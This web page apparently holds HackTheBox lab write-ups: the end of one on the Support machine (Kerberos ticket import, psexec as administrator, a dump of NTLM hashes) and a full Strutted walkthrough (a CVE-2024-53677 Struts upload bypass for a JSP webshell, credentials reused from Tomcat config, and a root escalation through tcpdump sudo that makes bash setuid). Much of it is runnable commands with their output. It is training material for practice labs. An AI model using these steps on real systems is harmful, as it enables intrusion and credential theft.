x3Bb3UvRG5JAL6K8JsU/iqajFYk+Ip5qhqqIN0XeR6ZqgrfwLKkc6YEBFMLyXgBMdccIfDHzE3VxGtWf</span><br><span class="line">      TH+bbEd3ulqnqxtkv3KKIGZceyTLpaogIMaV17Rr207aumrTpryoMuNVTocnHy2XrOJ3Ogcm7GhN7woy</span><br><span class="line">      ToTeEc3q/inRjLD/KRcJXcfgZdjgRZfYg1lZCwASwrtkYlD8i1jzMqxAQJiLzXQJptLMbm1hzoDH2lF7</span><br><span class="line">      5Yy6ZNrDPbs6nzzsQNah3YNxJfAtuAd+bMfuAyed1UcvQFlTgIW5MJRfJnj/mNNrqbLtzXIjxpr4+1Lf</span><br><span class="line">      qR1qQ+wNVhMPfQduhN/VdjZRC3eSyZGdvWnM++UXF9aTFiu9j3L0x/d8+OJpjy7qKAGyWtDEfesSWNJE</span><br><span class="line">      seyTLmLH0aABwmm4zCWMJRpGoDCt1JbvoprH+frDZt9UyLDUfgu658KTXYzooga/o7UWYqOB2TCB1qAD</span><br><span class="line">      AgEAooHOBIHLfYHIMIHFoIHCMIG/MIG8oBswGaADAgERoRIEENRQlhmS5+c1rHEuwqzyllihDRsLU1VQ</span><br><span class="line">      UE9SVC5IVEKiGjAYoAMCAQqhETAPGw1hZG1pbmlzdHJhdG9yowcDBQBApQAApREYDzIwMjUwNDAzMDgy</span><br><span class="line">      MDU1WqYRGA8yMDI1MDQwMzE4MjA1NVqnERgPMjAyNTA0MTAwODIwNTVaqA0bC1NVUFBPUlQuSFRCqSEw</span><br><span class="line">      H6ADAgECoRgwFhsEY2lmcxsOZGMuc3VwcG9ydC5odGI=</span><br><span class="line">[+] Ticket successfully imported!</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\lusowen&gt; .\Rubeus.exe klist</span><br><span class="line"></span><br><span class="line">   ______        _</span><br><span class="line">  (_____ \      | |</span><br><span class="line">   _____) )_   _| |__  _____ _   _  ___</span><br><span class="line">  |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">  | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">  |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line"></span><br><span class="line">  v2.2.0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Action: List Kerberos Tickets (Current User)</span><br><span class="line"></span><br><span class="line">[*] Current LUID    : 0xa154c3</span><br><span class="line"></span><br><span class="line">  UserName                 : support</span><br><span class="line">  Domain                   : SUPPORT</span><br><span class="line">  LogonId                  : 0xa154c3</span><br><span class="line">  UserSID                  : S-1-5-21-1677581083-3380853377-188903654-1105</span><br><span class="line">  AuthenticationPackage    : NTLM</span><br><span class="line">  LogonType                : Network</span><br><span class="line">  LogonTime                : 4/3/2025 12:21:45 AM</span><br><span class="line">  LogonServer              : DC</span><br><span class="line">  LogonServerDNSDomain     : support.htb</span><br><span class="line">  UserPrincipalName        : support@support.htb</span><br><span class="line"></span><br><span class="line">    [0] - 0x12 - aes256_cts_hmac_sha1</span><br><span class="line">      Start/End/MaxRenew: 4/3/2025 1:20:55 AM ; 4/3/2025 11:20:55 AM ; 4/10/2025 1:20:55 AM</span><br><span class="line">      Server Name       : cifs/dc.support.htb @ SUPPORT.HTB</span><br><span class="line">      Client Name       : administrator @ SUPPORT.HTB</span><br><span class="line">      Flags             : name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable (40a50000)</span><br><span class="line">==========================================================================</span><br><span class="line">$ nano ticket.b64</span><br><span class="line">#将base64的那段编码放进去</span><br><span class="line">$ base64 -d ticket.b64 &gt; ticket.kirbi</span><br><span class="line"></span><br><span class="line">$ ticketConverter.py ticket.kirbi ticket.ccache           </span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[*] converting kirbi to ccache...</span><br><span class="line">[+] done</span><br><span class="line"></span><br><span class="line">$ KRB5CCNAME=ticket.ccache psexec.py support.htb/administrator@dc.support.htb -k -no-pass</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[*] Requesting shares on dc.support.htb.....</span><br><span class="line">[*] Found writable share ADMIN$</span><br><span class="line">[*] Uploading file XUbGmpCE.exe</span><br><span class="line">[*] Opening SVCManager on dc.support.htb.....</span><br><span class="line">[*] Creating service XpwJ on dc.support.htb.....</span><br><span class="line">[*] Starting service XpwJ.....</span><br><span class="line">[!] Press help for extra shell commands</span><br><span class="line">Microsoft Windows [Version 10.0.20348.859]</span><br><span class="line">(c) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt; cd C:\users\administrator\desktop</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator\Desktop&gt; dir</span><br><span class="line"> Volume in drive C has no label.</span><br><span class="line"> Volume Serial Number is 955A-5CBB</span><br><span class="line"></span><br><span class="line"> Directory of C:\Users\Administrator\Desktop</span><br><span class="line"></span><br><span class="line">05/28/2022  04:17 AM    &lt;DIR&gt;          .</span><br><span class="line">05/28/2022  04:11 AM    &lt;DIR&gt;          ..</span><br><span class="line">04/02/2025  11:02 AM                34 root.txt</span><br><span class="line">               1 File(s)             34 bytes</span><br><span class="line">               2 Dir(s)   3,933,425,664 bytes free</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator\Desktop&gt; type root.txt</span><br><span class="line">7a80574ef22499ca66f7699fbb5c719a</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator\Desktop&gt; whoami</span><br><span class="line">nt authority\system</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="shell-as-nt-authority"><a href="#shell-as-nt-authority" class="headerlink" title="shell as nt authority"></a>shell as nt authority</h2><h3 id="hashes"><a href="#hashes" class="headerlink" title="hashes"></a>hashes</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:bb06cbc02b39abeddd1335bc30b19e26:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6303be52e22950b5bcb764ff2b233302:::</span><br><span class="line">ldap:1104:aad3b435b51404eeaad3b435b51404ee:b735f8c7172b49ca2b956b8015eb2ebe:::</span><br><span class="line">support:1105:aad3b435b51404eeaad3b435b51404ee:11fbaef07d83e3f6cde9f0ff98a3af3d:::</span><br><span class="line">smith.rosario:1106:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::</span><br><span class="line">hernandez.stanley:1107:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::</span><br><span class="line">wilson.shelby:1108:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::</span><br><span class="line">anderson.damian:1109:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::</span><br><span class="line">thomas.raphael:1110:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::</span><br><span class="line">levine.leopoldo:1111:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::</span><br><span class="line">raven.clifton:1112:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::</span><br><span class="line">bardot.mary:1113:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::</span><br><span class="line">cromwell.gerard:1114:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::</span><br><span class="line">monroe.david:1115:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::</span><br><span class="line">west.laura:1116:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::</span><br><span class="line">langley.lucy:1117:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::</span><br><span class="line">daughtler.mabel:1118:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::</span><br><span class="line">stoll.rachelle:1119:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::</span><br><span class="line">ford.victoria:1120:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::</span><br><span class="line">DC$:1000:aad3b435b51404eeaad3b435b51404ee:24501f0c63c517085f93146df7b3bff7:::</span><br><span class="line">MANAGEMENT$:2601:aad3b435b51404eeaad3b435b51404ee:3f99f2f26988d1f348d378e84f86bc58:::</span><br><span class="line">lusowen$:5601:aad3b435b51404eeaad3b435b51404ee:6927391aa711001aa774ea55c915fb44:::</span><br><span class="line">attackersystem$:5602:aad3b435b51404eeaad3b435b51404ee:ef266c6b963c0bb683941032008ad47f:::</span><br><span class="line"></span><br></pre></td></tr></table></figure>
    
    
  </div>

  

  

</article>
  
  <article class="post">
  <header class="post-header">
    <h1 class="post-title">
      
      <a class="post-link" href="/2025/06/19/HackTheBox%E2%80%94%E2%80%94HTB%20Strutted%20Writeup/HackTheBox%E2%80%94%E2%80%94HTB%20Strutted%20Writeup/">HackTheBox——HTB Strutted Writeup</a>
      
    </h1>

    <div class="post-meta">
      <span class="post-time">
        2025-06-19
      </span>
      
      
      
    </div>
  </header>

  

  <div class="post-content">
    
    
    

    
    <p>Welcome to N0nome&#96;s F**king <a href="https://n0nome.github.io/">blog</a>.<br>(:This is just a joke:)<br><a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8uK3T">Do you want to become stronger than me? You just need to move your hands more.</a></p>
<p><code>鉴于博主学识浅薄，文中只写通关，其中利害关系还需要各位Google学习</code><br><img src="/images/Pasted%20image%2020250225082458.png"><br><code>在退役吧唧中的免费吧唧</code></p>
<h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)</span><br><span class="line">|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.18.0 (Ubuntu)</span><br><span class="line">|_http-title: Did not follow redirect to http://strutted.htb/</span><br><span class="line">|_http-server-header: nginx/1.18.0 (Ubuntu)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 4.X|5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="line">OS details: Linux 4.15 - 5.19</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>先把域名加到hosts里面</p>
<p>看一眼web界面<br><img src="/images/Pasted%20image%2020250225100025.png"></p>
<h3 id="source-code"><a href="#source-code" class="headerlink" title="source code"></a>source code</h3><p>上来就是让上传文件<br>先看看别的，上下都有小字</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Upload Your Images, Get a Shareable Link</span><br><span class="line">Instantly upload an image and receive a unique, shareable link. Keep your images secure, accessible, and easy to share—anywhere, anytime.</span><br><span class="line">Supported file types: JPG, JPEG, PNG, GIF</span><br><span class="line">上传您的图像，获取可共享链接</span><br><span class="line">立即上传图像并接收独特的可共享链接。确保您的图像随时随地安全、可访问且易于共享。</span><br><span class="line">支持的文件类型：JPG、JPEG、PNG、GIF</span><br><span class="line"></span><br><span class="line">Interested in our setup?</span><br><span class="line">We provide a Docker image that showcases the Strutted™ environment. Click the Download link on the menu to explore our Docker image to see how our platform is configured, and use it as a base template for your own projects.</span><br><span class="line">对我们的设置感兴趣吗？</span><br><span class="line">我们提供了一个展示 Strutted™ 环境的 Docker 映像。单击菜单上的“下载”链接来探索我们的 Docker 映像，了解我们的平台是如何配置的，并将其用作您自己的项目的基本模板。</span><br></pre></td></tr></table></figure>
<p>提示说给了一个docker映像，在右上角download可以下载下来</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[10:03:10] athena:Strutted $ ls</span><br><span class="line">context.xml  Dockerfile  nmap.txt  README.md  strutted  strutted.zip  tomcat-users.xml</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>东西有点多，都看看</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[10:07:04] athena:Strutted $ cat tomcat-users.xml </span><br><span class="line">&lt;?xml version=&#x27;1.0&#x27; encoding=&#x27;utf-8&#x27;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;tomcat-users&gt;</span><br><span class="line">    &lt;role rolename=&quot;manager-gui&quot;/&gt;</span><br><span class="line">    &lt;role rolename=&quot;admin-gui&quot;/&gt;</span><br><span class="line">    &lt;user username=&quot;admin&quot; password=&quot;skqKY6360z!Y&quot; roles=&quot;manager-gui,admin-gui&quot;/&gt;</span><br><span class="line">&lt;/tomcat-users&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>有一个密码了，但是没啥用，</p>
<h3 id="Find-struts2-exploit"><a href="#Find-struts2-exploit" class="headerlink" title="Find struts2 exploit"></a>Find struts2 exploit</h3><h4 id="CVE-2024-53677"><a href="#CVE-2024-53677" class="headerlink" title="CVE-2024-53677"></a>CVE-2024-53677</h4><p>翻源码可以看到版本<br><img src="/images/Pasted%20image%2020250225102033.png"><br>Google一下<br>（其实源码还可以翻到点别的，比如说CVE<img src="/images/Pasted%20image%2020250225102141.png">）<br>Google翻到了<a target="_blank" rel="noopener" href="https://github.com/EQSTLab/CVE-2024-53677">CVE-2024-53677</a>的poc，git下来尝试一下（在Google上找一个jsp的webshell）<br><img src="/images/Pasted%20image%2020250225164559.png"></p>
<h4 id="analysis-upload-packets"><a href="#analysis-upload-packets" class="headerlink" title="analysis upload packets"></a>analysis upload packets</h4><p>返回了200，但是response里面还是home页面的信息，burp抓包看一下吧<br>直接上传jsp会提示<code>Supported file types: JPG, JPEG, PNG, GIF!</code><br><img src="/images/Pasted%20image%2020250225165235.png"><br>尝试绕过一下，改一下后缀<br>又提示不是图像<br><img src="/images/Pasted%20image%2020250225165408.png"><br>那只能加魔术字了</p>
<p>找一个jpg或者png文件传上去，burp抓去发送到repeater，将魔术字下面的内容替换成我们的jspshell内容</p>
<p>昨天看了一篇<a target="_blank" rel="noopener" href="https://potato.gold/data/uploads/pdf/%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF%E7%B1%BB%E4%B9%A6%E7%B1%8D/%E8%85%BE%E8%AE%AFWAF%E6%8C%91%E6%88%98%E8%B5%9B%E5%9B%9E%E5%BF%86%E5%BD%95.pdf">文章</a>，是关于绕过的，但是也看到了一个熟悉的身影——multipart&#x2F;form-data; boundary&#x3D;的</p>
<p><img src="/images/Pasted%20image%2020250304172924.png"><br>上传成功，但是没有办法解析成jsp<br>回看一下上面CVE的详解去<br>可能<a target="_blank" rel="noopener" href="https://github.com/TAM-K592/CVE-2024-53677-S2-067/blob/ALOK/Check-CVE-2024-53677.py">原始的poc</a>是这个？上面用的那个是人家自己改的，都运用top.UploadFileName去尝试覆盖文件名<br><code>坏习惯，有poc不先看好人家的利用原理和具体过程</code></p>
<h4 id="adjust-upload-packets"><a href="#adjust-upload-packets" class="headerlink" title="adjust upload packets"></a>adjust upload packets</h4><p>这样的话双写一下boundary&#x3D;尝试一下覆盖<br><img src="/images/Pasted%20image%2020250305082913.png"><br>在res里面可以看到有上传成功，访问一下<br><img src="/images/Pasted%20image%2020250305083014.png"><br>ok，可以进入shell了<br><img src="/images/Pasted%20image%2020250305083931.png"></p>
<h3 id="Shell-As-Tomcat"><a href="#Shell-As-Tomcat" class="headerlink" title="Shell As Tomcat"></a>Shell As Tomcat</h3><p>看下用户</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">tomcat@strutted:~$ <span class="built_in">cat</span> /etc/passwd | grep sh</span><br><span class="line"><span class="built_in">cat</span> /etc/passwd | grep sh</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">sshd:x:106:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">james:x:1000:1000:Network Administrator:/home/james:/bin/bash</span><br></pre></td></tr></table></figure>
<p>看样子下一步是james了<br>当前用户是tomcat，找一下配置文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">tomcat@strutted:/etc/tomcat9$ <span class="built_in">ls</span> -la</span><br><span class="line"><span class="built_in">ls</span> -la</span><br><span class="line">total 220</span><br><span class="line">drwxr-xr-x   4 root root     4096 Jan 15 14:30 .</span><br><span class="line">drwxr-xr-x 107 root root     4096 Jan 21 13:54 ..</span><br><span class="line">drwxrwxr-x   3 root tomcat   4096 Jan 15 14:30 Catalina</span><br><span class="line">-rw-r-----   1 root tomcat   7276 Jan 15  2022 catalina.properties</span><br><span class="line">-rw-r-----   1 root tomcat   1400 Jan 15  2022 context.xml</span><br><span class="line">-rw-r-----   1 root tomcat   1149 Jan 15  2022 jaspic-providers.xml</span><br><span class="line">-rw-r-----   1 root tomcat   2799 Jul 19  2022 logging.properties</span><br><span class="line">drwxr-xr-x   2 root tomcat   4096 Jan 15 14:30 policy.d</span><br><span class="line">-rw-r-----   1 root tomcat   7606 Jan  7 10:40 server.xml</span><br><span class="line">-rw-r-----   1 root tomcat   2902 Jan 11 13:49 tomcat-users.xml</span><br><span class="line">-rw-r-----   1 root tomcat 172359 Jan 15  2022 web.xml</span><br><span class="line">tomcat@strutted:/etc/tomcat9$ grep <span class="string">&#x27;password&#x27;</span> -ri .</span><br><span class="line">grep <span class="string">&#x27;password&#x27;</span> -ri .</span><br><span class="line">./tomcat-users.xml:  you must define such a user - the username and password are arbitrary.</span><br><span class="line">./tomcat-users.xml:  will also need to <span class="built_in">set</span> the passwords to something appropriate.</span><br><span class="line">./tomcat-users.xml:  &lt;user username=<span class="string">&quot;admin&quot;</span> password=<span class="string">&quot;&lt;must-be-changed&gt;&quot;</span> roles=<span class="string">&quot;manager-gui&quot;</span>/&gt;</span><br><span class="line">./tomcat-users.xml:  &lt;user username=<span class="string">&quot;robot&quot;</span> password=<span class="string">&quot;&lt;must-be-changed&gt;&quot;</span> roles=<span class="string">&quot;manager-script&quot;</span>/&gt;</span><br><span class="line">./tomcat-users.xml:  &lt;user username=<span class="string">&quot;admin&quot;</span> password=<span class="string">&quot;IT14d6SSP81k&quot;</span> roles=<span class="string">&quot;manager-gui,admin-gui&quot;</span>/&gt;</span><br><span class="line">./tomcat-users.xml:  them. You will also need to <span class="built_in">set</span> the passwords to something appropriate.</span><br><span class="line">./tomcat-users.xml:  &lt;user username=<span class="string">&quot;tomcat&quot;</span> password=<span class="string">&quot;&lt;must-be-changed&gt;&quot;</span> roles=<span class="string">&quot;tomcat&quot;</span>/&gt;</span><br><span class="line">./tomcat-users.xml:  &lt;user username=<span class="string">&quot;both&quot;</span> password=<span class="string">&quot;&lt;must-be-changed&gt;&quot;</span> roles=<span class="string">&quot;tomcat,role1&quot;</span>/&gt;</span><br><span class="line">./tomcat-users.xml:  &lt;user username=<span class="string">&quot;role1&quot;</span> password=<span class="string">&quot;&lt;must-be-changed&gt;&quot;</span> roles=<span class="string">&quot;role1&quot;</span>/&gt;</span><br><span class="line">./server.xml:      &lt;!-- Use the LockOutRealm to prevent attempts to guess user passwords</span><br></pre></td></tr></table></figure>
<p>找到一个密码<code>IT14d6SSP81k</code>,试一下james<br><img src="/images/Pasted%20image%2020250305084326.png"></p>
<h3 id="Shell-As-James"><a href="#Shell-As-James" class="headerlink" title="Shell As James"></a>Shell As James</h3><h4 id="GTFObins-find-tcpdump-exploit"><a href="#GTFObins-find-tcpdump-exploit" class="headerlink" title="GTFObins find tcpdump exploit"></a>GTFObins find tcpdump exploit</h4><p>因为有密码可以先看下sudo -l</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">james@strutted:~$ <span class="built_in">sudo</span> -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> james on localhost:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty</span><br><span class="line"></span><br><span class="line">User james may run the following commands on localhost:</span><br><span class="line">    (ALL) NOPASSWD: /usr/sbin/tcpdump</span><br></pre></td></tr></table></figure>
<p>翻阅<a target="_blank" rel="noopener" href="https://gtfobins.github.io/#tcp">GTFObins</a>发现有利用<br><img src="/images/Pasted%20image%2020250305084926.png"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">james@strutted:~$ COMMAND=<span class="string">&#x27;chmod 4777 /bin/bash&#x27;</span></span><br><span class="line">TF=$(<span class="built_in">mktemp</span>)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$COMMAND</span>&quot;</span> &gt; <span class="variable">$TF</span></span><br><span class="line"><span class="built_in">chmod</span> +x <span class="variable">$TF</span></span><br><span class="line"><span class="built_in">sudo</span> tcpdump -<span class="built_in">ln</span> -i lo -w /dev/null -W 1 -G 1 -z <span class="variable">$TF</span> -Z root</span><br><span class="line">tcpdump: listening on lo, link-type EN10MB (Ethernet), snapshot length 262144 bytes</span><br><span class="line">Maximum file <span class="built_in">limit</span> reached: 1</span><br><span class="line">1 packet captured</span><br><span class="line">4 packets received by filter</span><br><span class="line">0 packets dropped by kernel</span><br><span class="line">james@strutted:~$ bash -p</span><br><span class="line">bash-5.1# </span><br></pre></td></tr></table></figure>
<p>get root</p>
<h3 id="Hashes"><a href="#Hashes" class="headerlink" title="Hashes"></a>Hashes</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">root:$y$j9T$4kM4HKyBvH.VNLjh.Zd60/$27BeC7cFIgPH.bVrllpoxXQwtc4tMCN6EZkI9Tqbw/B:20100:0:99999:7:::</span><br><span class="line">daemon:*:19405:0:99999:7:::</span><br><span class="line">bin:*:19405:0:99999:7:::</span><br><span class="line">sys:*:19405:0:99999:7:::</span><br><span class="line">sync:*:19405:0:99999:7:::</span><br><span class="line">games:*:19405:0:99999:7:::</span><br><span class="line">man:*:19405:0:99999:7:::</span><br><span class="line">lp:*:19405:0:99999:7:::</span><br><span class="line">mail:*:19405:0:99999:7:::</span><br><span class="line">news:*:19405:0:99999:7:::</span><br><span class="line">uucp:*:19405:0:99999:7:::</span><br><span class="line">proxy:*:19405:0:99999:7:::</span><br><span class="line">www-data:*:19405:0:99999:7:::</span><br><span class="line">backup:*:19405:0:99999:7:::</span><br><span class="line">list:*:19405:0:99999:7:::</span><br><span class="line">irc:*:19405:0:99999:7:::</span><br><span class="line">gnats:*:19405:0:99999:7:::</span><br><span class="line">nobody:*:19405:0:99999:7:::</span><br><span class="line">_apt:*:19405:0:99999:7:::</span><br><span class="line">systemd-network:*:19405:0:99999:7:::</span><br><span class="line">systemd-resolve:*:19405:0:99999:7:::</span><br><span class="line">messagebus:*:19405:0:99999:7:::</span><br><span class="line">systemd-timesync:*:19405:0:99999:7:::</span><br><span class="line">pollinate:*:19405:0:99999:7:::</span><br><span class="line">sshd:*:19405:0:99999:7:::</span><br><span class="line">syslog:*:19405:0:99999:7:::</span><br><span class="line">uuidd:*:19405:0:99999:7:::</span><br><span class="line">tcpdump:*:19405:0:99999:7:::</span><br><span class="line">tss:*:19405:0:99999:7:::</span><br><span class="line">landscape:*:19405:0:99999:7:::</span><br><span class="line">fwupd-refresh:*:19405:0:99999:7:::</span><br><span class="line">usbmux:*:19474:0:99999:7:::</span><br><span class="line">lxd:!:19474::::::</span><br><span class="line">tomcat:!*:20095::::::</span><br><span class="line">james:$y$j9T$Agb7G27RJ0LCkmXQ3kDEK0$xoWkrSDF/pC4dkrIlBKe0LpYWCZH4YTz0NJ/zEn8.59:20100:0:99999:7:::</span><br></pre></td></tr></table></figure>

    
    
  </div>

  

  

</article>
  
    
  <nav class="pagination">  
      
      
      <a class="next" href="/page/2/">  
        <span class="next-text">Next</span>  
        <i class="iconfont icon-right"></i>  
      </a>  
      
  </nav>  
  

  
</section>
        </div>
          

      </div>
    </main>
    <footer id="footer" class="footer">
      <!-- Social Links -->

<div class="social-links">
  
  
  
  
  <a href="mailto:your@email.com" class="iconfont icon-email" title="email"></a>
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  <a target="_blank" rel="noopener" href="https://github.com/ahonn" class="iconfont icon-github" title="github"></a>
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  

  
  
  <a href="/atom.xml" class="iconfont icon-rss" title="rss"></a>
  
</div>



<div class="copyright">
  <span class="power-by">
    Powered by <a class="hexo-link" target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>
  </span>
  <span class="division">|</span>
  <span class="theme-info">
    Theme -
    <a class="theme-link" target="_blank" rel="noopener" href="https://github.com/ahonn/hexo-theme-even">Even</a>
  </span>
  <span class="division">|</span>
  <span class="hosting-info">
    footer.hosting
  </span>

  <span class="copyright-year">
    <span>
      
      &copy;
      
      2015 - 2025      
    </span>

    <span class="heart">
      <i class="iconfont icon-heart"></i>
    </span>

    <span class="author">n0nome</span>
  </span>

</div>
    </footer>
    <div class="back-to-top" id="back-to-top"> <i class="iconfont icon-up"></i> </div>
  </div>
    

  







<script type="text/javascript" src="/lib/jquery/jquery.min.js"></script>



<script type="text/javascript" src="/lib/slideout/slideout.js"></script>



<script type="text/javascript" src="/lib/fancybox/jquery.fancybox.pack.js"></script>



  <script type="text/javascript" src="/js/src/even.js?v=3.0.0"></script>
</body>

</html>